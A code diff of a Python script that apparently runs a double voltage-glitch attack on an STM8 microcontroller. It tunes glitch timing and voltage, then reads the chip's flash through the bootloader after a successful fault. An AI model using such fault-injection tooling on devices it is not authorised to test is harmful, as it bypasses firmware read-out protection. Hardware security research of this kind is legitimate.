@@ -43,35 +43,41 @@ class Main:
     def __init__(self, args):
         self.args = args
         self.parameters = {
-            "length": 24,
-            "voltage": 1.10,
+            "length": 1896,
+            "voltage": 2.08,
             "delay1": [
+            # "s_delay": 35250,
+            # "e_delay": 35400,
+
+                range(29400, 29750)
                 # range(28450, 28540),
                 # range(28950, 29020),
                 # range(29240, 29260),
                 # range(29400, 29500),
-                range(29460, 29520),  # very good
+                # range(29460, 29520),
                 # range(30200, 30270),
                 # range(31950, 32020),
             ],
             "delay2": [
-                range(34690, 34750),  # seems most promising
-                range(35150, 35250),  # was range(35190, 35240), also very promising
-                range(35680, 35730),
-                range(36210, 36234),
-                range(37200, 37250),
-                range(37450, 37550),
+                range(34800, 34900),
+                range(35200, 35400),
+                # range(34690, 34750),  # seems most promising
+                # range(35150, 35250),  # was range(35190, 35240), also very promising
+                # range(35680, 35730),
+                # range(36210, 36234),
+                # range(37200, 37250),
+                # range(37450, 37550),
             ],
         }
 
         if args.programmer:
             self.programmer = STM8Reader(port=args.programmer)
+        else:
+            self.programmer = None
 
-        self.findus_glitcher = BootloaderProfilingGlitcher()
         self.glitcher = GlitcherClient(args.rpico)
-        self.glitcher.open()
-
-        self.glitcher.power_cycle_reset(1000)
+        self.glitcher.power_cycle_reset(50_000)
+        self.findus_glitcher = BootloaderProfilingGlitcher()
 
         self.db = Database(
             sys.argv + [f"{k}={v}" for k, v in self.parameters.items()],
@@ -111,11 +117,10 @@ class Main:
 
             try:
                 self.glitcher.wait_done(0.1) # connect TRIGGER to RESET
-                time.sleep(100e-6)
                 success = self.glitcher.adc27() > 500
 
                 if success:
-                    if self.args.programmer:
+                    if self.programmer:
                         enable_tx()
                         self.programmer.enter_bootloader()
                         flash = self.programmer.read_memory(0x8000, 0x2000)
@@ -133,11 +138,11 @@ class Main:
                         )
 
                     # send_pushover_notification(
-                    #     message=f"Successful glitch! with delays={delay1},{delay2} ns, length={length} ns, voltage={self.parameters['voltage']:.2f} V",
+                    #     message=f"Successful double glitch! with delays={delay1},{delay2} ns, length={length} ns, voltage={self.parameters['voltage']:.2f} V",
                     #     title="Successful glitch",
                     # )
 
-                    if self.args.programmer:
+                    if self.programmer:
                         break
 
                     state = b"success"
@@ -188,7 +193,6 @@ if __name__ == "__main__":
     )
     p.add_argument(
         "--programmer",
-        default="/dev/ttyAMA0",
         help="STM8 bootloader programmer serial port",
     )
     p.add_argument("--resume", action="store_true", help="Resume previous database run")
